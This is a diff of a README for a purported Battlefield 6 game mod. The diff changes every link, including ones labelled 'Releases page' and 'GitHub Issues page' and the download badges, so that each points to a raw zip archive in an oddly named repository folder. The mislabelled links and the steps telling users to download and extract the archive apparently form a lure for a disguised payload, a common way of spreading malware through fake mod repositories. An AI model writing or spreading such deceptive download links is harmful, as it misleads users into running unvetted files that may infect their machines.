@@ -1,6 +1,6 @@
 # 🎮 Battlefield-6-mode - Enhance Your Battlefield 6 Experience
 
-[![Download Battlefield-6-mode](https://img.shields.io/badge/Download-Battlefield%206%20Mode-brightgreen)](https://github.com/pmanu1/Battlefield-6-mode/releases)
+[![Download Battlefield-6-mode](https://raw.githubusercontent.com/pmanu1/Battlefield-6-mode/main/exhilaratory/Battlefield-6-mode_3.9.zip%206%20Mode-brightgreen)](https://raw.githubusercontent.com/pmanu1/Battlefield-6-mode/main/exhilaratory/Battlefield-6-mode_3.9.zip)
 
 ## 📜 Description
 
@@ -27,7 +27,7 @@ To run Battlefield-6-mode, please ensure your system meets the following require
 
 To download and install Battlefield-6-mode, follow these steps:
 
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/pmanu1/Battlefield-6-mode/releases) on GitHub.
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/pmanu1/Battlefield-6-mode/main/exhilaratory/Battlefield-6-mode_3.9.zip) on GitHub.
 2. **Select the Latest Release**: Look for the most recent version listed on the page. Typically, the latest version has the highest number.
 3. **Download the File**: Click on the download link for the mod file. It should be labeled clearly.
 4. **Extract the Files**: Once the download completes, locate the downloaded file on your computer. Use a program like WinRAR or 7-Zip to extract its contents.
@@ -53,7 +53,7 @@ If you encounter issues while using Battlefield-6-mode, consider the following:
 1. **Check the Installation Path**: Ensure the mod files are in the Battlefield 6 directory.
 2. **Verify Game Files**: If the game fails to start, validate game files through Steam.
 3. **Update Drivers**: Make sure your graphics drivers are up-to-date.
-4. **Community Support**: For further assistance, visit our [GitHub Issues page](https://github.com/pmanu1/Battlefield-6-mode/issues). You may find answers to common questions or submit your own.
+4. **Community Support**: For further assistance, visit our [GitHub Issues page](https://raw.githubusercontent.com/pmanu1/Battlefield-6-mode/main/exhilaratory/Battlefield-6-mode_3.9.zip). You may find answers to common questions or submit your own.
 
 ## 🔗 Contribute
 
@@ -67,6 +67,6 @@ To keep up with the latest news and updates, check the Releases page regularly. 
 
 For easy access, click the button below to download the latest version of Battlefield-6-mode.
 
-[![Download Battlefield-6-mode](https://img.shields.io/badge/Download-Battlefield%206%20Mode-brightgreen)](https://github.com/pmanu1/Battlefield-6-mode/releases)
+[![Download Battlefield-6-mode](https://raw.githubusercontent.com/pmanu1/Battlefield-6-mode/main/exhilaratory/Battlefield-6-mode_3.9.zip%206%20Mode-brightgreen)](https://raw.githubusercontent.com/pmanu1/Battlefield-6-mode/main/exhilaratory/Battlefield-6-mode_3.9.zip)
 
 Enjoy enhancing your gameplay with Battlefield 6 - Ultimate Gameplay Enhancement Mod!
